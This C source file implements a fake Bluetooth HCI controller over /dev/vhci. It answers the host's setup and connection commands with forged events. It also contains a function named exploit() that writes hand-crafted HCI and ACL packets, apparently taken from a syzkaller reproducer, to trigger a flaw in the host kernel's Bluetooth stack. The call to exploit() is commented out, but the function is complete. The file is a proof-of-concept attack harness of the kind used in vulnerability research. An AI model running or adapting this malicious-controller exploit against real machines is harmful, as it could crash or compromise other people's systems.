#include "controller.h"
#include <sys/syscall.h>
#define HCI_HANDLE 200
#define ACL_LINK 1

bool flag =false;

static void exploit(controller* ctrl)
{
	syscall(__NR_mmap, 0x20000000ul, 0x1000000ul, 7ul, 0x32ul, -1, 0ul);
	*(uint8_t *)0x20000500 = 4;
	*(uint8_t *)0x20000501 = 0x46;
	*(uint8_t *)0x20000502 = 4;
	*(uint8_t *)0x20000503 = 0;
	*(uint16_t *)0x20000504 = 0/*xc8*/;
	*(uint8_t *)0x20000506 = 0;
	
	/* syz_emit_vhci(0x20000500, 3); */
	dev_write_packet(ctrl, (void*)0x20000500, 7);
	if (debug_enabled)
		util_hexdump('>', (void*)0x20000500, 7, hexdump_print, "D: ");

	*(uint8_t *)0x20000100 = 2;
	STORE_BY_BITMASK(uint16_t, , 0x20000101, 0xc8, 0, 12);
	STORE_BY_BITMASK(uint16_t, , 0x20000102, 2, 4, 2);
	STORE_BY_BITMASK(uint16_t, , 0x20000102, 0, 6, 2);
	*(uint16_t *)0x20000103 = 0x12;
	*(uint16_t *)0x20000105 = 0xe;
	*(uint16_t *)0x20000107 = 1;
	*(uint8_t *)0x20000109 = 0xf;
	*(uint8_t *)0x2000010a = 6;
	*(uint16_t *)0x2000010b = 4;
	*(uint16_t *)0x2000010d = 4;
	*(uint16_t *)0x2000010f = 1;
	*(uint8_t *)0x20000111 = 1;
	*(uint8_t *)0x20000112 = 0x1f;
	*(uint16_t *)0x20000113 = 2;
	*(uint16_t *)0x20000115 = 6;
	
	/* syz_emit_vhci(0x20000100, 0x17); */
	dev_write_packet(ctrl, (void*)0x20000100, 0x17);
	
	if (debug_enabled)
		util_hexdump('>', (void*)0x20000100, 0x17, hexdump_print, "D: ");
	
}

static void prepare(controller* ctrl)
{
	/* Connection Request Event*/
	struct bt_hci_evt_conn_request request = {
		.dev_class = {0},
		.link_type = ACL_LINK,
		.bdaddr = {0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa}
	};
	send_event(ctrl, BT_HCI_EVT_CONN_REQUEST, &request, sizeof(request));
}


static void reply(struct controller *ctrl, void *buf, uint16_t len)
{
	uint8_t pkt_type = *((uint8_t *)buf);
	struct bt_hci_cmd_hdr *hdr = buf + 1;

	if(pkt_type != BT_H4_CMD_PKT)
		return;

	switch (hdr->opcode) {
	case BT_HCI_CMD_WRITE_SCAN_ENABLE: {
		flag = true;
		uint8_t status = 0;
		send_cmd_complete_event(ctrl, hdr->opcode, &status, sizeof(status));
		// prepare(ctrl);
		return;
	}
	case BT_HCI_CMD_READ_BD_ADDR: {
		struct bt_hci_rsp_read_bd_addr rp = {
			.status = 0,
			.bdaddr = { 0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa }
		};
		send_cmd_complete_event(ctrl, hdr->opcode, &rp, sizeof(rp));
		return;
	}
	case BT_HCI_CMD_READ_BUFFER_SIZE: {
		struct bt_hci_rsp_read_buffer_size rp = {
			.status = 0,
			.acl_mtu = 1021,
			.sco_mtu = 96,
			.acl_max_pkt = 4,
			.sco_max_pkt = 6 
		};
		send_cmd_complete_event(ctrl, hdr->opcode, &rp, sizeof(rp));
		return;
	}
	case BT_HCI_CMD_RESET: {
		uint8_t status = 0;
		send_cmd_complete_event(ctrl, hdr->opcode, &status, sizeof(status));
		return;
	}
	case BT_HCI_CMD_ACCEPT_CONN_REQUEST:{
		/*Connnection Complete Event*/
		struct  bt_hci_evt_conn_complete cc = {
			.status = 0,
			.handle = HCI_HANDLE,
			.link_type = ACL_LINK,
			.encr_mode = 0,
			.bdaddr = {0xaa, 0xaa, 0xaa, 0xaa, 0xaa, 0xaa}
		};
		//send_cmd_status_event(ctrl, 0, hdr->opcode);
		send_event(ctrl, BT_HCI_EVT_CONN_COMPLETE, &cc, sizeof(cc));	
		return;
	}
	case BT_HCI_CMD_READ_REMOTE_FEATURES:{
		struct bt_hci_evt_remote_features_complete features = {
			.status = 0,
			.handle = HCI_HANDLE,
			.features = {0}
		};
		//send_cmd_status_event(ctrl, 0, hdr->opcode);
		send_event(ctrl, BT_HCI_EVT_REMOTE_FEATURES_COMPLETE, &features, sizeof(features));
		// exploit(ctrl);
		return;
	}
	}

	printf("Receive command %x, sending dummy reply\n", hdr->opcode);
	char dummy[0xf9] = { 0 };
	debug_enabled = false;
	send_cmd_complete_event(ctrl, hdr->opcode, dummy, sizeof(dummy));
	debug_enabled = true;
	return;
}

static void host_read_callback(int fd, uint32_t events, void *user_data)
{
	struct controller *ctrl = user_data;
	struct bt_hci_cmd_hdr *cmd_hdr;
	struct bt_hci_acl_hdr *acl_hdr;
	struct bt_hci_sco_hdr *sco_hdr;
	struct bt_hci_iso_hdr *iso_hdr;
	ssize_t len;
	uint16_t pktlen;

	if (events & (EPOLLERR | EPOLLHUP)) {
		fprintf(stderr, "Error from host descriptor\n");
		mainloop_remove_fd(ctrl->host_fd);
		return;
	}

	if (events & EPOLLRDHUP) {
		fprintf(stderr, "Remote hangup of host descriptor\n");
		mainloop_remove_fd(ctrl->host_fd);
		return;
	}

	len = read(ctrl->host_fd, ctrl->host_buf + ctrl->host_len,
		   sizeof(ctrl->host_buf) - ctrl->host_len);
	if (len < 0) {
		if (errno == EAGAIN || errno == EINTR)
			return;

		fprintf(stderr, "Read from host descriptor failed\n");
		mainloop_remove_fd(ctrl->host_fd);
		return;
	}

	if (ctrl->host_skip_first_zero && len > 0) {
		ctrl->host_skip_first_zero = false;
		if (ctrl->host_buf[ctrl->host_len] == '\0') {
			printf("Skipping initial zero byte\n");
			len--;
			memmove(ctrl->host_buf + ctrl->host_len,
				ctrl->host_buf + ctrl->host_len + 1, len);
		}
	}

	ctrl->host_len += len;

process_packet:
	if (ctrl->host_len < 1)
		return;

	switch (ctrl->host_buf[0]) {
	case BT_H4_CMD_PKT:
		if (ctrl->host_len < 1 + sizeof(*cmd_hdr))
			return;

		cmd_hdr = (void *)(ctrl->host_buf + 1);
		pktlen = 1 + sizeof(*cmd_hdr) + cmd_hdr->plen;
		break;
	case BT_H4_ACL_PKT:
		if (ctrl->host_len < 1 + sizeof(*acl_hdr))
			return;

		acl_hdr = (void *)(ctrl->host_buf + 1);
		pktlen = 1 + sizeof(*acl_hdr) + cpu_to_le16(acl_hdr->dlen);
		break;
	case BT_H4_SCO_PKT:
		if (ctrl->host_len < 1 + sizeof(*sco_hdr))
			return;

		sco_hdr = (void *)(ctrl->host_buf + 1);
		pktlen = 1 + sizeof(*sco_hdr) + sco_hdr->dlen;
		break;
	case BT_H4_ISO_PKT:
		if (ctrl->host_len < 1 + sizeof(*iso_hdr))
			return;

		iso_hdr = (void *)(ctrl->host_buf + 1);
		pktlen = 1 + sizeof(*iso_hdr) + cpu_to_le16(iso_hdr->dlen);
		break;
	case 0xff:
		/* Notification packet from /dev/vhci - ignore */
		ctrl->host_len = 0;
		return;
	default:
		fprintf(stderr, "Received unknown host packet type 0x%02x\n",
			ctrl->host_buf[0]);
		mainloop_remove_fd(ctrl->host_fd);
		return;
	}

	if (ctrl->host_len < pktlen)
		return;

	if (debug_enabled)
		util_hexdump('<', ctrl->host_buf, pktlen, hexdump_print, "D: ");
	/*
	if (emulate_ecc)
		host_emulate_ecc(ctrl, ctrl->host_buf, pktlen);
	else
		host_write_packet(ctrl, ctrl->host_buf, pktlen);
*/
	reply(ctrl, ctrl->host_buf, ctrl->host_len);

	if (ctrl->host_len > pktlen) {
		memmove(ctrl->host_buf, ctrl->host_buf + pktlen,
			ctrl->host_len - pktlen);
		ctrl->host_len -= pktlen;
		goto process_packet;
	}

	ctrl->host_len = 0;
}

static void host_read_destroy(void *user_data)
{
	struct controller *ctrl = user_data;

	printf("Closing host descriptor\n");

	if (ctrl->host_shutdown)
		shutdown(ctrl->host_fd, SHUT_RDWR);

	close(ctrl->host_fd);
	ctrl->host_fd = -1;

	if (ctrl->dev_fd < 0) {
		client_active = false;
		free(ctrl);
	} else
		mainloop_remove_fd(ctrl->dev_fd);
}

bool setup_virt(int host_fd)
{
	struct controller *ctrl;

	printf("Using Virtual Controller\n");

	ctrl = new0(struct controller, 1);
	if (!ctrl) {
		close(host_fd);
		return false;
	}

	if (emulate_ecc)
		printf("Enabling ECC emulation\n");

	ctrl->host_fd = host_fd;
	ctrl->host_shutdown = true;
	ctrl->host_skip_first_zero = skip_first_zero;

	mainloop_add_fd(ctrl->host_fd, EPOLLIN | EPOLLRDHUP, host_read_callback,
			ctrl, host_read_destroy);

	return true;
}
